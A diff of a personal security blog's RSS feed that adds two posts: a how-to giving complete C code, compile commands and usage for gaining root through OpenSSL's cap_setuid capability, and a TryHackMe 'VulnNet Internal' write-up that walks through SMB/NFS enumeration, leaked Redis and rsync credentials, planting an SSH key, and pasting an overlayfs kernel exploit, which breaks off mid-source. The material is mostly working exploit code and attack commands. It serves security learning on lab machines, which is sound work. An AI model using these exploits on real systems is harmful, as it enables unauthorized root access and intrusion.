@@ -6,7 +6,541 @@
         <description>Recent content on Tanishq Chaudhary</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 16 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 17 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>How to: OpenSSL cap_setuid&#43;ep PrivEsc Exploit</title>
+        <link>/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</link>
+        <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
+        
+        <guid>/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</guid>
+        <description>&lt;img src="https://i.imgur.com/rZQE6hL.png" alt="Featured image of post How to: OpenSSL cap_setuid&#43;ep PrivEsc Exploit" /&gt;&lt;p&gt;Consider the binary &lt;code&gt;/usr/bin/openssl&lt;/code&gt; has capabilities set as the following.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Is there a way to become root from a normal user by using this? YES! Let&amp;rsquo;s explore how.&lt;/p&gt;
+&lt;h3 id=&#34;checklist-will-it-work-for-me&#34;&gt;Checklist: Will It Work For Me?&lt;/h3&gt;
+&lt;p&gt;Search all the binaries&#39; capibilities using: &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt;.
+Explaination:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;getcap&lt;/code&gt; is the tool we will use&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-r&lt;/code&gt; is the recursive flag&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;2&amp;gt;/dev/null&lt;/code&gt; directs the standard error stream to &lt;code&gt;/dev/null&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If you see &lt;code&gt;/usr/bin/openssl = cap_setuid+ep&lt;/code&gt;, we are set for success.&lt;/p&gt;
+&lt;h3 id=&#34;requirements-on-your-system&#34;&gt;Requirements (On Your System)&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;We will use &lt;code&gt;#include &amp;lt;openssl/engine.h&amp;gt;&lt;/code&gt; header in our exploit engine file. On debian based systems, use: &lt;code&gt;sudo apt-get install libssl-dev&lt;/code&gt; to install.&lt;/li&gt;
+&lt;li&gt;gcc&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;getting-the-exploit-ready&#34;&gt;Getting The Exploit Ready&lt;/h3&gt;
+&lt;p&gt;Create a file named &lt;code&gt;openssl-exploit-engine.c&lt;/code&gt; with contents as such:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;openssl/engine.h&amp;gt;
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0); setgid(0);
+  system(&amp;quot;/bin/bash&amp;quot;);
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()   
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Explaination:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;we import the required header file&lt;/li&gt;
+&lt;li&gt;we create a function as specified by Reference 2 (see below)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;setuid(0); setgid(0);&lt;/code&gt;: we set the &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;gid&lt;/code&gt; to 0&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;system(&amp;quot;/bin/bash&amp;quot;)&lt;/code&gt;: spawn a &lt;code&gt;bash&lt;/code&gt; shell&lt;/li&gt;
+&lt;li&gt;the last two lines are required by OpenSSL&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;compiling&#34;&gt;Compiling&lt;/h3&gt;
+&lt;p&gt;Run the following:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Output for 1:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$  gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
+openssl-exploit-engine.c: In function ‘bind’:
+openssl-exploit-engine.c:5:3: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    5 |   setuid(0); setgid(0);
+      |   ^~~~~~
+openssl-exploit-engine.c:5:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    5 |   setuid(0); setgid(0);
+      |              ^~~~~~
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is safe to ignore warnings here.&lt;/p&gt;
+&lt;p&gt;Resultant is the &lt;code&gt;openssl-exploit-engine.so&lt;/code&gt; file.&lt;/p&gt;
+&lt;h3 id=&#34;transferring-the-file&#34;&gt;Transferring the file&lt;/h3&gt;
+&lt;p&gt;Using &lt;code&gt;python3&lt;/code&gt;&amp;rsquo;s http server, and wget on the target machine, we can transfer the file.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;start up python3 server in the directory where you have the file, as such: &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt;. this starts the server on port 80.&lt;/li&gt;
+&lt;li&gt;use wget or curl the file as such: &lt;code&gt;wget YOUR_RELEVANT_IP/openssl-exploit-engine.so&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;root-finally&#34;&gt;Root (Finally!)&lt;/h3&gt;
+&lt;p&gt;Once you have the file, run the following, at the location of the so file.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;openssl req -engine ./openssl-exploit-engine.so&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Sample output&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;user@server:~$ openssl req -engine ./openssl-exploit-engine.so
+root@server:~# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Enjoy!&lt;/p&gt;
+&lt;h3 id=&#34;common-errors&#34;&gt;Common Errors&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$  gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
+openssl-exploit-engine.c:1:10: fatal error: openssl/engine.h: No such file or directory
+    1 | #include &amp;lt;openssl/engine.h&amp;gt;
+      |          ^~~~~~~~~~~~~~~~~~
+compilation terminated.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you get this error, check the section on Requirements.&lt;/p&gt;
+&lt;h3 id=&#34;references&#34;&gt;References&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Read up more on capabilities&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OpenSSL building a useless engine&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/openssl/#library-load&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;How to use the library load feature OpenSSL&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>TryHackMe: VulnNet Internal Writeup</title>
+        <link>/p/tryhackme-vulnnet-internal-writeup/</link>
+        <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
+        
+        <guid>/p/tryhackme-vulnnet-internal-writeup/</guid>
+        <description>&lt;img src="https://i.imgur.com/3ec8CfD.png" alt="Featured image of post TryHackMe: VulnNet Internal Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/vulnnetinternal&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Play&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
+&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;Not shown: 993 closed ports
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
+|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
+|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
+111/tcp  open     rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      35488/udp6  mountd
+|   100005  1,2,3      54985/tcp   mountd
+|   100005  1,2,3      56181/tcp6  mountd
+|   100005  1,2,3      56789/udp   mountd
+|   100021  1,3,4      32910/udp   nlockmgr
+|   100021  1,3,4      42203/tcp6  nlockmgr
+|   100021  1,3,4      42497/tcp   nlockmgr
+|   100021  1,3,4      49999/udp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+873/tcp  open     rsync       (protocol version 31)
+2049/tcp open     nfs_acl     3 (RPC #100227)
+9090/tcp filtered zeus-admin
+Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -39m57s, deviation: 1h09m16s, median: 1s
+| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| Names:
+|   VULNNET-INTERNA&amp;lt;00&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   VULNNET-INTERNA&amp;lt;03&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   VULNNET-INTERNA&amp;lt;20&amp;gt;  Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
+|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: vulnnet-internal
+|   NetBIOS computer name: VULNNET-INTERNAL\x00
+|   Domain name: \x00
+|   FQDN: vulnnet-internal
+|_  System time: 2021-06-16T05:50:05+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-16T03:50:05
+|_  start_date: N/A
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ssh open&lt;/li&gt;
+&lt;li&gt;rpcbind looks interesting&lt;/li&gt;
+&lt;li&gt;rsync working&lt;/li&gt;
+&lt;li&gt;SMB open&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s start with SMB.&lt;/p&gt;
+&lt;h3 id=&#34;12-smb-enumeration&#34;&gt;1.2. SMB Enumeration&lt;/h3&gt;
+&lt;p&gt;Listing all the shares.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ smbclient -L 10.10.95.197 -N    
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        shares          Disk      VulnNet Business Shares
+        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;code&gt;smbclient //10.10.95.197/shares -N&lt;/code&gt; we can get in, and see all of the files in the directories. We see &lt;code&gt;temp&lt;/code&gt; and &lt;code&gt;data&lt;/code&gt; directories in &lt;code&gt;shares&lt;/code&gt;. One by one, I got all of the files, using the command:&lt;code&gt;get file_name.extension&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s all of what I got:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ cat business-req.txt 
+We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
+If you have any questions, please text or phone us.
+                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cat data.txt 
+Purge regularly data that is not needed anymore
+                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cat services.txt 
+THM{flag_was_here_yee}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;None of them are interesting, and this looks like a dead end. Let&amp;rsquo;s check out port 111, rpcbind.&lt;/p&gt;
+&lt;h3 id=&#34;13-rpc-bind&#34;&gt;1.3. RPC-Bind&lt;/h3&gt;
+&lt;p&gt;Googling, we get &lt;a class=&#34;link&#34; href=&#34;https://sites.cns.utexas.edu/oit-blog/blog/port-111-rpcbind-vulnerability&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;this&lt;/a&gt;. A DDoS attack. This is not useful for us.&lt;/p&gt;
+&lt;p&gt;Okay, how about the NFS thingy listed in the nmap scan results, inside of RPC bind?&lt;/p&gt;
+&lt;h3 id=&#34;14-nfs&#34;&gt;1.4. NFS&lt;/h3&gt;
+&lt;p&gt;Let&amp;rsquo;s list them out. The &lt;code&gt;-e&lt;/code&gt; or &lt;code&gt;--exports&lt;/code&gt; flag gives us the export list of a server.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/impacket/examples]
+└─$ showmount --exports 10.10.95.197
+Export list for 10.10.95.197:
+/opt/conf *
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Configuration files are usually very interesting. Let&amp;rsquo;s get these files on our system.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ mount -t nfs 10.10.95.197:/opt/conf conf
+mount.nfs: failed to apply fstab options
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What is happening here?&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; or &lt;code&gt;--type&lt;/code&gt; helps us specify the type of mount we want to do, which is &lt;code&gt;nfs&lt;/code&gt;. Common filesystem types are &lt;code&gt;ext2&lt;/code&gt;, &lt;code&gt;xfs&lt;/code&gt;, &lt;code&gt;brtfs&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;rest of the syntax is ssh-like&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;conf&lt;/code&gt; at the end is the name of the emptuy directory on my system&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Don&amp;rsquo;t forget the sudo option if &lt;code&gt;mount -t nfs&lt;/code&gt; gives you errors.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
+└─$ sudo mount -t nfs 10.10.95.197:/opt/conf conf
+[sudo] password for kali: 
+                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cd conf                  
+                                                                        
+┌──(kali㉿kali)-[/tmp/conf]
+└─$ ls
+hp  init  opt  profile.d  redis  vim  wildmidi
+                                                                        
+┌──(kali㉿kali)-[/tmp/conf]
+└─$ tree .     
+.
+├── hp
+│   └── hplip.conf
+├── init
+│   ├── anacron.conf
+│   ├── lightdm.conf
+│   └── whoopsie.conf
+├── opt
+├── profile.d
+│   ├── bash_completion.sh
+│   ├── cedilla-portuguese.sh
+│   ├── input-method-config.sh
+│   └── vte-2.91.sh
+├── redis
+│   └── redis.conf
+├── vim
+│   ├── vimrc
+│   └── vimrc.tiny
+└── wildmidi
+    └── wildmidi.cfg
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Quick googling tells me &lt;code&gt;redis&lt;/code&gt; is related to database. Things just got intersting!&lt;/p&gt;
+&lt;h3 id=&#34;15-getting-in-redis&#34;&gt;1.5. Getting in Redis&lt;/h3&gt;
+&lt;p&gt;Let&amp;rsquo;s search for passwords, using &lt;code&gt;pass&lt;/code&gt; or &lt;code&gt;password&lt;/code&gt; like terms.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp/conf]
+└─$ grep -r &amp;quot;pass&amp;quot; .
+./redis/redis.conf:# 2) No password is configured.
+./redis/redis.conf:# If the master is password protected (using the &amp;quot;requirepass&amp;quot; configuration
+./redis/redis.conf:# masterauth &amp;lt;master-password&amp;gt;
+./redis/redis.conf:requirepass &amp;quot;B65Hx562F@ggAZ@F&amp;quot;
+./redis/redis.conf:# resync is enough, just passing the portion of data the slave missed while
+./redis/redis.conf:# 150k passwords per second against a good box. This means that you should
+./redis/redis.conf:# use a very strong password otherwise it will be very easy to break.
+./redis/redis.conf:# requirepass foobared
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since we have the password, one option is to use &lt;strong&gt;telnet&lt;/strong&gt;. It works using the same TCP/IP protocol we are familiar with. &lt;code&gt;telnet MACHINE_IP PORT_NUMBER&lt;/code&gt; gets you in. Use the command &lt;code&gt;AUTH mmm&lt;/code&gt;, where mmm is the password to authorize yourself.&lt;/p&gt;
+&lt;p&gt;Alternatively, download &lt;code&gt;redis-cli&lt;/code&gt;, which looks better and has autocomplete suggestions.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://lzone.de/cheat-sheet/Redis&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Redis Cheat Sheet here&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/]
+└─$ redis-cli -h 10.10.95.197 -a &amp;quot;B65Hx562F@ggAZ@F&amp;quot;
+Warning: Using a password with &#39;-a&#39; or &#39;-u&#39; option on the command line interface may not be safe.
+10.10.95.197:6379&amp;gt; keys *
+1) &amp;quot;tmp&amp;quot;
+2) &amp;quot;authlist&amp;quot;
+3) &amp;quot;int&amp;quot;
+4) &amp;quot;internal flag&amp;quot;
+5) &amp;quot;marketlist&amp;quot;
+10.10.95.197:6379&amp;gt; type &amp;quot;internal flag&amp;quot;
+string
+10.10.95.197:6379&amp;gt; get &amp;quot;internal flag&amp;quot;
+&amp;quot;THM{ff8e518addbbddb74531a724236a8221}&amp;quot;
+10.10.95.197:6379&amp;gt; type &amp;quot;marketlist&amp;quot;
+list
+10.10.95.197:6379&amp;gt; type &amp;quot;authlist&amp;quot;
+list
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The commands are self explanatory.&lt;/p&gt;
+&lt;h3 id=&#34;exploring-redis&#34;&gt;Exploring Redis&lt;/h3&gt;
+&lt;p&gt;What about &lt;code&gt;marketlist&lt;/code&gt;?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10.10.95.197:6379&amp;gt; lrange marketlist 0 9000
+1) &amp;quot;Machine Learning&amp;quot;
+2) &amp;quot;Penetration Testing&amp;quot;
+3) &amp;quot;Programming&amp;quot;
+4) &amp;quot;Data Analysis&amp;quot;
+5) &amp;quot;Analytics&amp;quot;
+6) &amp;quot;Marketing&amp;quot;
+7) &amp;quot;Media Streaming&amp;quot;
+10.10.95.197:6379&amp;gt; type &amp;quot;Machine Learning&amp;quot;
+none
+10.10.95.197:6379&amp;gt; type &amp;quot;Analytics&amp;quot;
+none
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing. What about &lt;code&gt;authlist&lt;/code&gt;?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;10.10.95.197:6379&amp;gt; lrange &amp;quot;authlist&amp;quot; 0 9000
+1) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
+2) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
+3) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
+4) &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;lrange&lt;/code&gt; is basically an iterator, going from value 0 to 9000. Looks like a base64 encoded string.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ echo &amp;quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&amp;quot; | base64 -d
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! We have the exact syntax listed, which we can modify for our use. &lt;code&gt;127.0.0.1&lt;/code&gt; becomes &lt;code&gt;MACHINE_IP&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Using &lt;code&gt;rsync rsync://rsync-connect@MACHINE_IP&lt;/code&gt; we see an interesting directory. Continuing, we get &lt;code&gt;rsync rsync://rsync-connect@MACHINE_IP:/file/sys-internal/&lt;/code&gt;. Listing this looks like sys-internal&amp;rsquo;s file system. Using a bit of directory enumeration, we can get the user flag and the &lt;code&gt;id_rsa&lt;/code&gt;!&lt;/p&gt;
+&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
+&lt;h3 id=&#34;21-sneaking-in-ssh&#34;&gt;2.1 Sneaking in SSH&lt;/h3&gt;
+&lt;p&gt;I checked the &lt;code&gt;.ssh&lt;/code&gt; directory, which seems to be empty. Putting in a file called &lt;code&gt;authorized_keys&lt;/code&gt; file contating our &lt;code&gt;id_rsa.pub&lt;/code&gt; will allow us to connect using SSH without as password ;)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/.ssh]
+└─$ rsync -ahv ./id_rsa.pub  rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/authorized_keys
+Password: 
+sending incremental file list
+id_rsa.pub
+
+sent 671 bytes  received 35 bytes  83.06 bytes/sec
+total size is 563  speedup is 0.80
+                                                            
+┌──(kali㉿kali)-[~/.ssh]
+└─$ rsync rsync://rsync-connect@10.10.81.234:/files/sys-internal/.ssh/                   
+Password: 
+drwxrwxr-x          4,096 2021/06/16 01:12:15 .
+-rw-r--r--            563 2021/05/25 13:02:37 authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s login!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh sys-internal@10.10.81.234                
+The authenticity of host &#39;10.10.81.234 (10.10.81.234)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:0ysriVjo72WRJI6UecJ9s8z6QHPNngSiMUKWFTO6Vr4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.81.234&#39; (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+541 packages can be updated.
+342 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+sys-internal@vulnnet-internal:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;*in hacker voice* We are in!&lt;/p&gt;
+&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s check the common priv-esc vectors.&lt;/p&gt;
+&lt;p&gt;SUID? sudo? crontab? nope. Kernel exploit?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sys-internal@vulnnet-internal:~$ uname -a
+Linux vulnnet-internal 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yes! We can use the &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/39230&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;overlayfs local priv esc exploit&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Use the following -&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat &amp;lt;&amp;lt; EOF &amp;gt; filename.extension
+{blah blah}
+EOF
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;syntax to echo multiple lines in a file.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sys-internal@vulnnet-internal:~$ cat &amp;lt;&amp;lt;EOF&amp;gt;xpl.c
+#define _GNU_SOURCE
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;err.h&amp;gt;
+#include &amp;lt;errno.h&amp;gt;
+#include &amp;lt;sched.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;sys/stat.h&amp;gt;
+#include &amp;lt;sys/wait.h&amp;gt;
+#include &amp;lt;sys/mount.h&amp;gt;
+
+//#include &amp;lt;attr/xattr.h&amp;gt;
+//#include &amp;lt;sys/xattr.h&amp;gt;
+int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+
+
+#define DIR_BASE    &amp;quot;./ovlcap&amp;quot;
+#define DIR_WORK    DIR_BASE &amp;quot;/work&amp;quot;
+#define DIR_LOWER   DIR_BASE &amp;quot;/lower&amp;quot;
+#define DIR_UPPER   DIR_BASE &amp;quot;/upper&amp;quot;
+#define DIR_MERGE   DIR_BASE &amp;quot;/merge&amp;quot;
+#define BIN_MERGE   DIR_MERGE &amp;quot;/magic&amp;quot;
+#define BIN_UPPER   DIR_UPPER &amp;quot;/magic&amp;quot;
+
+
+static void xmkdir(const char *path, mode_t mode)
+{
+    if (mkdir(path, mode) == -1 &amp;amp;&amp;amp; errno != EEXIST)
+        err(1, &amp;quot;mkdir %s&amp;quot;, path);
+}
+
+static void xwritefile(const char *path, const char *data)
+{
+    int fd = open(path, O_WRONLY);
+    if (fd == -1)
+        err(1, &amp;quot;open %s&amp;quot;, path);
+    ssize_t len = (ssize_t) strlen(data);
+    if (write(fd, data, len) != len)
+        err(1, &amp;quot;write %s&amp;quot;, path);
+    close(fd);
+}
+
+static void xcopyfile(const char *src, const char *dst, mode_t mode)
+{
+    int fi, fo;
+
+    if ((fi = open(src, O_RDONLY)) == -1)
+        err(1, &amp;quot;open %s&amp;quot;, src);
+    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
+        err(1, &amp;quot;open %s&amp;quot;, dst);
+
+    char buf[4096];
+    ssize_t rd, wr;
+
+    for (;;) {
+        rd = read(fi, buf, sizeof(buf));
+        if (rd == 0) {
+            break;
+        } else if (rd == -1) {
+            if (errno == EINTR)
+                continue;
